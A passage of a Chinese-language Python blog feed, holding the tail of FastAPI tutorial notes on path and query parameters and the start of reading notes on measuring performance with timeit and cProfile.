class="hljs-string">&quot;some blogs about python&quot;</span><br><br>    <span class="hljs-keyword">if</span> tag.value == <span class="hljs-string">&quot;web&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;some blogs about web&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;some blogs about linux&quot;</span><br><span class="hljs-comment"># 有了</span><br></code></pre></td></tr></table></figure><ul><li><p><code>TagName</code>继承 <code>Enum</code>是为了使用枚举类型，继承 <code>str</code>是为了有类型提示和API文档显示功能。（python3.11可以直接使用StrEnum）</p></li><li><p>有了枚举类型，可以直接使用枚举变量的 <code>namne</code>和 <code>value</code>两个属性。</p><ul><li><p>name：表示枚举变量的名字，比如， PYTHON</p></li><li><p>value：表示枚举变量的值，比如，python</p></li></ul></li><li><p>有了<code>TagName</code>，FastAPI就知道tag这个路劲参数只有三个字符串类型的值，如果URL中有其他值就会直接报错。</p></li></ul><h2 id="2-3-路径参数使用Path-校验"><a href="#2-3-路径参数使用Path-校验" class="headerlink" title="2-3 路径参数使用Path 校验"></a>2-3 路径参数使用Path 校验</h2><p>需求场景：</p><p>限制入参的长度，比如说字符串长度、数字大小。使用Path()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Path<br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blog/&#123;name&#125;&quot;</span></span>) </span><span class="hljs-comment"># 最小3个字符，最多10个字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blog_by_name</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span> = Path(<span class="hljs-params">min_length=<span class="hljs-number">3</span>, max_length=<span class="hljs-number">10</span></span>)</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;the length of this blog name is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(name)&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blog/&#123;id&#125;&quot;</span></span>) </span><span class="hljs-comment"># 最小3-10之间</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blog_by_id</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span> = Path(<span class="hljs-params">ge=<span class="hljs-number">3</span>, le=<span class="hljs-number">10</span></span>)</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><h2 id="2-4-Path之接口文档设置【可以看一下】"><a href="#2-4-Path之接口文档设置【可以看一下】" class="headerlink" title="2-4 Path之接口文档设置【可以看一下】"></a>2-4 Path之接口文档设置【可以看一下】</h2><p>Path()不仅可以用来做路径参数的校验逻辑，还可以用来设置接口文档的展示功能，常用的设置字段如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">alias:      <span class="hljs-comment"># 设置别名，修改是要配合路径装饰器中的参数名一块修改</span><br>title:      <span class="hljs-comment"># 设置标题，在redoc中有显示</span><br>description:         <span class="hljs-comment"># 设置参数描述信息</span><br>example:     <span class="hljs-comment"># 设置例子</span><br>examples:     <span class="hljs-comment"># 设置多个例子，比较复杂</span><br>deprecated:     <span class="hljs-comment"># 将要废弃该接口</span><br>include_in_schema:  <span class="hljs-comment"># 是否把schema显示在api文档</span><br></code></pre></td></tr></table></figure><p>示例1： examples</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Path<br><br><br>app = FastAPI()<br><br>examples = &#123;<br>    <span class="hljs-string">&quot;valid&quot;</span>: &#123;<span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-number">20</span>&#125;,<br>    <span class="hljs-string">&quot;invalid&quot;</span>: &#123;<span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-number">8</span>&#125;,<br>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blog/&#123;id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blog_by_id</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span> = Path(<span class="hljs-params">ge=<span class="hljs-number">10</span>, example=examples</span>)</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><h2 id="2-5-设置查询参数-分页和排序"><a href="#2-5-设置查询参数-分页和排序" class="headerlink" title="2-5 设置查询参数 分页和排序"></a>2-5 设置查询参数 分页和排序</h2><p>比如，图书列表页面，使用page和size两个查询参数做分页，但存在URL中没有携带这俩参数的情况，此时能否有默认值呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br>books = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;图书<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>random.shuffle(books)<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span>, sort: <span class="hljs-built_in">bool</span></span>):<br>    results = books[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">if</span> sort: <span class="hljs-comment"># 如果sort是ture</span><br>        results.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;id&quot;</span>]) <span class="hljs-comment"># 进行sort 排序</span><br><br>    <span class="hljs-keyword">return</span> results <span class="hljs-comment"># 否则直接返回分页</span><br></code></pre></td></tr></table></figure><p>看一下他的请求就知道了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1:8000/books?page=1&amp;size=5&amp;<span class="hljs-built_in">sort</span>=1<br>http://127.0.0.1:8000/books?page=1&amp;size=5&amp;<span class="hljs-built_in">sort</span>=True<br>http://127.0.0.1:8000/books?page=1&amp;size=5&amp;<span class="hljs-built_in">sort</span>=<span class="hljs-literal">true</span><br>http://127.0.0.1:8000/books?page=1&amp;size=5&amp;<span class="hljs-built_in">sort</span>=on<br>http://127.0.0.1:8000/books?page=1&amp;size=5&amp;<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h2 id="2-6-查询参数有多个值"><a href="#2-6-查询参数有多个值" class="headerlink" title="2-6 查询参数有多个值"></a>2-6 查询参数有多个值</h2><p>URL上可能携带多个相同的查询参数，<code>/books?id=10&amp;id=20</code>，此时如何获取多个id这个查询参数的多个值？</p><p>示例1：<strong>在路径函数内定义多个查询参数时，需要遵循Python形参顺序的基本原则：先位置参数，后关键字参数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 正确的顺序</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span>, sort: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>):<br>    results = books[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">if</span> sort:<br>        results.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;id&quot;</span>])<br>    <span class="hljs-keyword">return</span> results<br><br><span class="hljs-comment"># 错误的顺序</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span>, sort: <span class="hljs-built_in">bool</span></span>):<br>    results = books[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">if</span> sort:<br>        results.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;id&quot;</span>])<br>    <span class="hljs-keyword">return</span> results<br></code></pre></td></tr></table></figure><p>示例2：获取URL中相同参数的多个值，需要使用Query()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Query<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: typing.<span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>] = Query(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><h2 id="2-7-查询参数使用Query校验"><a href="#2-7-查询参数使用Query校验" class="headerlink" title="2-7 查询参数使用Query校验"></a>2-7 查询参数使用Query校验</h2><h2 id="2-8-路径参数和查询参数的顺序问题"><a href="#2-8-路径参数和查询参数的顺序问题" class="headerlink" title="2-8 路径参数和查询参数的顺序问题"></a>2-8 路径参数和查询参数的顺序问题</h2><p>你是否有疑问：一个接口中既有路径参数，又有查询参数，FastAPI是如何区分它们的，和顺序有关系吗？</p><p>你是否有疑问：一个接口中的路径参数和查询参数的顺序有关系吗，为什么我定义参数会有语法错误，无法运行程序？</p><p>原则：</p><ul><li><p><strong>路径函数内的形参名字不能重复</strong></p></li><li><p><strong>普通类型的参数默认会被识别为查询参数，比如：<code>int</code>, <code>float</code>, <code>str</code>, <code>bool</code>；复杂类型需要配合Query()显示声明为查询参数</strong></p></li><li><p><strong>只要形参的名字出现在路径装饰器中定义的参数，则肯定是路径参数，即使使用了Query()</strong></p></li></ul><h2 id="2-9-阶段总结"><a href="#2-9-阶段总结" class="headerlink" title="2-9 阶段总结"></a>2-9 阶段总结</h2><ul><li>结论1：路径指的就是路由或者说URL，分静态路由和动态路由</li><li>结论2：动态路由中的参数，就是路径参数；只要定义在路径函数的形参和路径装饰器中的参数同名，则该形参就会被是被为路径参数</li><li>结论3：<strong>路径参数默认是必须的</strong>，且参数类型默认是字符串，可以使用路径转化器或者类型提示的方式做类型转换</li><li>结论4：跟在URL <code>?</code> 后面的键值对参数称之为 查询参数，默认是字符串类型，可以使用类型提示的方式做类型转化</li><li>结论5：普通类型的形参（int&#x2F;str&#x2F;float&#x2F;bool），FastAPI会默认它为查询参数；也可以使用Query()显示声明</li><li>结论6：使用Path()给路径参数做校验，使用Query()给查询参数做校验；做API文档的设置</li><li>结论7：查询参数和路过参数的定义顺序无关，FastAPI能都自动是被它们</li><li>结论8：定义在路径函数内形参的顺序，需要遵循：<strong>没有默认值的放在前面，有默认值的放在后面（python的语法要求）</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 简单说：路径参数是从 URL 路径中提取的参数，在路由路径中使用花括号 &#123;&#125; 包围参数名称来定义。例如，/users/&#123;user_id&#125; 中的 user_id 就是一个路径参数。在处理函数中，你可以像普通函数参数一样声明路径参数，并指定其类型。FastAPI 将自动从请求 URL 中提取参数的值，并将其传递给相应的处理函数。</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/users/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;user_id&quot;</span>: user_id&#125;<br><span class="hljs-comment"># 查询参数是，查询参数是附加在 URL 后面的参数，使用 ? 分隔 URL 和查询参数，然后以 key=value 的形式添加到 URL 中。FastAPI 会自动解析查询参数，并将其传递给处理函数。</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/items/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_items</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;page&quot;</span>: page, <span class="hljs-string">&quot;limit&quot;</span>: limit&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之性能测算和大O算法分析（十三）</title>
    <link href="/2024/01/11/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E7%AE%97%E5%92%8C%E5%A4%A7O%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/"/>
    <url>/2024/01/11/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E7%AE%97%E5%92%8C%E5%A4%A7O%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="第-13-章-性能测量和大O算法分析"><a href="#第-13-章-性能测量和大O算法分析" class="headerlink" title="第 13 章　性能测量和大O算法分析"></a>第 13 章　性能测量和大O算法分析</h1><blockquote><p>　　对于大多数小型程序而言，性能可能没那么重要。我们也许会花一小时来为任务编写一个自动化脚本，而这个脚本只要几秒钟就能运行完。就算时间再长一些，也不过是我们端着咖啡杯回到办公桌旁的时长。</p></blockquote><p>　　有些情况下，对于花时间学习如何提升脚本速度要持谨慎态度，因为我们需要先学习程序的运行速度测量方法，否则无法知道所做的修改是否提升了程序的速度。而这就是Python模块<code>timeit</code>和<code>cProfile</code>的用武之地。这些模块不仅可以测量代码的运行速度，还会生成一个配置文件，说明代码的哪些部分已经足够快，哪些部分仍需改进。</p><p>　　除了测量程序的速度，你还将在本章学习如何测量理论上因程序需要处理的数据增加，程序运行时间随之增加的增速。在计算机科学领域中，它被称为<strong>大O记法</strong>。缺乏传统计算机科学背景的软件开发人员可能有时会觉得自己的知识储备不够全面。尽管计算机科学教育颇有成果，但对软件开发的直接作用可能有限。我曾开玩笑（但也不无道理）地说，大O记法占了我学位中80%的有用内容。本章对这个实用话题进行了介绍。</p><h2 id="13-1-timeit模块"><a href="#13-1-timeit模块" class="headerlink" title="13.1　timeit模块"></a>13.1　<code>timeit</code>模块</h2><p>　　“过早优化是万恶之源”是软件开发领域中的一句俗语。（这句话经常被认为是出自计算机科学家高德纳，但他又将其归功于计算机科学家Tony Hoare。Tony Hoare则认为这归功于高德纳。）过早优化，也就是在知道具体需要优化的内容前盲目地进行优化，往往表现在程序员试图通过巧妙的方式来节省内存或编写更快的代码。一个例子是使用XOR算法来交换两个整数值，而不是使用额外的临时变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a, b = <span class="hljs-number">42</span>, <span class="hljs-number">101</span> <span class="hljs-comment"># 设置两个变量</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(a, b)<br><span class="hljs-number">42</span> <span class="hljs-number">101</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># 通过一系列 ^ XOR运算交换它们的值：</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = a ^ b<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = a ^ b<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = a ^ b<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(a, b) <span class="hljs-comment"># 目前两个值已经被交换了</span><br><span class="hljs-number">101</span> <span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>　　如果你不熟悉XOR算法（该算法使用<code>^</code>位运算符），那么这段代码看起来会很神秘。使用巧妙的编程技巧的弊端在于它会产生复杂、不可读的代码。我们应该记住“Python之禅”的原则之一——“可读性很重要”。</p><p>　　更糟糕的是，这可能只是你自以为的巧妙之举。你不能总是一拍脑门儿就认为一个精巧的编程方法更快，而将被它取代的旧代码很慢。只有测量并比较运行时间（运行一个程序或一段代码所需的时间）才是证明快速与否的唯一方法。要知道运行时间的增加意味着程序在变慢，也就是程序需要更多的时间来做同样的工作。有一个类似的概念，我们有时也将程序的运行时间简称为<strong>运行时</strong>（runtime）。“这个错误发生在运行时”意味着错误发生在程序运行期间，而非程序被编译成字节码时。</p><p>　　Python标准库的<code>timeit</code>模块会将待测量的一小段代码运行数千次，甚至数百万次，以确定平均运行时间。<code>timeit</code>模块还可以暂时禁用自动垃圾回收器，以避免其对运行时间造成的差异。如果想测试多行代码，可以传递一个多行代码字符串，或者使用分号分隔多行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> timeit<br><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;a, b = 42, 101; a = a ^ b; b = a ^ b; a = a ^ b&#x27;</span>)<br><span class="hljs-number">0.1307766629999998</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&quot;&quot;&quot;a, b = 42, 101</span><br><span class="hljs-string"><span class="hljs-meta">... </span>a = a ^ b</span><br><span class="hljs-string"><span class="hljs-meta">... </span>b = a ^ b</span><br><span class="hljs-string"><span class="hljs-meta">... </span>a = a ^ b&quot;&quot;&quot;</span>)<br><span class="hljs-number">0.13515726800000039</span><br></code></pre></td></tr></table></figure><p>　　在我的计算机上，XOR算法运行这段代码只需要大约0.1秒，这个速度够快吗？来和使用额外临时变量的整数交换代码对比一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> timeit<br><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;a, b = 42, 101; temp = a; a = b; b = temp&#x27;</span>)<br><span class="hljs-number">0.027540389999998638</span><br></code></pre></td></tr></table></figure><p>　　出乎意料吧？使用额外变量不仅可读性更好，而且速度也快了两倍。巧妙的XOR技巧可能会节省几字节的内存，但代价是减慢了速度并降低了代码可读性。牺牲代码的可读性来减少几字节的内存使用或者纳秒级别的运行时间并不值当。</p><p>　　更好的做法是使用多重赋值技巧交换两个变量，也叫作迭代解包。它的速度更快：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;a, b = 42, 101; a, b = b, a&#x27;</span>)<br><span class="hljs-number">0.024489236000007963</span><br></code></pre></td></tr></table></figure><p>它在可读性和速度两方面都是最好的。这个结论不是拍脑门儿想出来的，而是出于客观的测量。</p><p>　　<code>timeit.timeit()</code>函数也可以接受第二个字符串类型参数，用作初始化代码。初始化代码仅在最初运行一次。也可以传递一个整数作为数字关键字参数改变默认的试验次数。比如，下面的测试测量了Python的<code>random</code>模块生成10 000 000个1到100的随机数需要多长时间（在我的计算机上需要大约10秒）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;random.randint(1, 100)&#x27;</span>, <span class="hljs-string">&#x27;import random&#x27;</span>, number=<span class="hljs-number">10000000</span>)<br><span class="hljs-number">10.020913950999784</span><br></code></pre></td></tr></table></figure><p>　　默认情况下，传递给<code>timeit.timeit()</code>的代码字符串不能访问程序其他部分的变量和函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> timeit<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam = <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-comment"># 定义spam变量</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;print(spam)&#x27;</span>, number=<span class="hljs-number">1</span>) <span class="hljs-comment"># 测量打印spam的时间</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>  File <span class="hljs-string">&quot;C:\Users\Al\AppData\Local\Programs\Python\Python37\lib\timeit.py&quot;</span>,<br>line <span class="hljs-number">232</span>, <span class="hljs-keyword">in</span> timeit<br>    <span class="hljs-keyword">return</span> Timer(stmt, setup, timer, <span class="hljs-built_in">globals</span>).timeit(number)<br>  File <span class="hljs-string">&quot;C:\Users\Al\AppData\Local\Programs\Python\Python37\lib\timeit.py&quot;</span>,<br>line <span class="hljs-number">176</span>, <span class="hljs-keyword">in</span> timeit<br>    timing = self.inner(it, self.timer)<br>  File <span class="hljs-string">&quot;&lt;timeit-src&gt;&quot;</span>, line <span class="hljs-number">6</span>, <span class="hljs-keyword">in</span> inner<br>NameError: name <span class="hljs-string">&#x27;spam&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br></code></pre></td></tr></table></figure><p>为了解决这个问题，可以将<code>globals()</code>1的返回值作为<code>globals</code>关键字参数：</p><p>1Python内置函数的作用是以字典类型返回全部全局变量。——译者注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="hljs-string">&#x27;print(spam)&#x27;</span>, number=<span class="hljs-number">1</span>, <span class="hljs-built_in">globals</span>=<span class="hljs-built_in">globals</span>())<br>hello<br><span class="hljs-number">0.000994909999462834</span><br></code></pre></td></tr></table></figure><p>　　编写代码的一个有效准则是先让它跑起来，再让它快起来。只有当你有了一个能用的程序后，你才需要专注于它的效率，让它变得更高效。</p><h2 id="13-2-cProfile分析器"><a href="#13-2-cProfile分析器" class="headerlink" title="13.2　cProfile分析器"></a>13.2　<code>cProfile</code>分析器</h2><p>　　<code>timeit</code>模块对测量小的代码片段很有效，但<code>cProfile</code>模块在分析整个函数或程序时更具优势。</p><p>　　程序分析可以系统性地分析程序的运行速度、内存使用情况等。<code>cProfile</code>模块是Python的分析器，用于测量程序的运行时间和程序内各个函数调用消耗的时间。这些信息为代码提供了更细粒度的测量结果。</p><p>　　要使用<code>cProfile</code>分析器，请将待测量的代码串传递给<code>cProfile.run()</code>。来看看<code>cProfile</code>是如何测量和报告一个短函数的执行情况的。该函数的作用是将1到1 000 000的数字进行求和运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, cProfile<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addUpNumbers</span>():<br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000001</span>):<br>        total += i<br><br>cProfile.run(<span class="hljs-string">&#x27;addUpNumbers()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>运行该程序得到的输出是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">      <span class="hljs-number">4</span> function calls <span class="hljs-keyword">in</span> <span class="hljs-number">0.064</span> seconds<br><br>Ordered by: standard name<br><br>ncalls  tottime  percall  cumtime  percall filename:lineno(function)<br>     <span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.064</span>    <span class="hljs-number">0.064</span> &lt;string&gt;:<span class="hljs-number">1</span>(&lt;module&gt;)<br>     <span class="hljs-number">1</span>    <span class="hljs-number">0.064</span>    <span class="hljs-number">0.064</span>    <span class="hljs-number">0.064</span>    <span class="hljs-number">0.064</span> test1.py:<span class="hljs-number">2</span>(addUpNumbers)<br>     <span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.064</span>    <span class="hljs-number">0.064</span> &#123;built-<span class="hljs-keyword">in</span> method builtins.<span class="hljs-built_in">exec</span>&#125;<br>     <span class="hljs-number">1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span> &#123;method <span class="hljs-string">&#x27;disable&#x27;</span> of <span class="hljs-string">&#x27;_lsprof.Profiler&#x27;</span> objects&#125;<br></code></pre></td></tr></table></figure><p>　　每一行标注了不同的函数花费的时间。<code>cProfile.run()</code>的输出中的列的解释如下。</p><ul><li>**<code>ncalls</code>**：对函数的调用次数。</li><li>**<code>tottime</code>**：该函数花费的总时间，注意不包括在子函数中花费的时间。</li><li>**<code>percall</code>**：<code>tottime</code>除以调用次数。</li><li>**<code>cumtime</code>**：在该函数及其子函数内花费的累计时间。</li><li>**<code>percall</code>**2：<code>cumtime</code>除以调用次数。</li><li>**<code>filename:lineno(function)</code>**：该函数所在的文件及行号。</li></ul><p>2注意这个名字跟前面一样，并非存在错误。——译者注</p><p>　　比如，你可以从No 